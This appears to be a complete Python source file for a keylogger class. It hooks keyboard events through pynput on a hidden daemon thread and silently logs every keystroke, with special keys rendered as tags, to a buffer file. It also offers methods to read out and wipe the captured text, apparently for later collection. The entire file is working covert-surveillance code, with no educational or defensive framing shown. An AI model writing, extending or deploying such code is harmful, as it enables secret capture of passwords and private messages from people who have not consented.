import threading
import os


class Keylogger:
    def __init__(self, buffer_path):
        self.buffer_path = buffer_path
        self.listener = None
        self.running = False
        self._lock = threading.Lock()

    def start(self):
        if self.running:
            return True
        try:
            from pynput.keyboard import Listener, Key
        except ImportError:
            return False

        def on_press(key):
            with self._lock:
                try:
                    with open(self.buffer_path, "a", encoding="utf-8") as f:
                        try:
                            f.write(key.char)
                        except AttributeError:
                            special = {
                                Key.space: " ",
                                Key.enter: "[ENTER]\n",
                                Key.tab: "[TAB]",
                                Key.backspace: "[BS]",
                                Key.esc: "[ESC]",
                                Key.shift: "",
                                Key.shift_r: "",
                                Key.ctrl: "",
                                Key.ctrl_r: "",
                                Key.alt: "",
                                Key.alt_r: "",
                                Key.cmd: "",
                            }
                            f.write(special.get(key, f"[{key.name}]"))
                        f.flush()
                except Exception:
                    pass

        try:
            self.listener = Listener(on_press=on_press)
            self.listener.daemon = True
            self.listener.start()
            self.running = True
            return True
        except Exception:
            return False

    def stop(self):
        self.running = False
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
            self.listener = None

    def dump(self):
        with self._lock:
            if not os.path.exists(self.buffer_path):
                return ""
            try:
                with open(self.buffer_path, "r", encoding="utf-8") as f:
                    data = f.read()
                return data
            except Exception:
                return ""

    def clear(self):
        with self._lock:
            try:
                open(self.buffer_path, "w").close()
            except Exception:
                pass
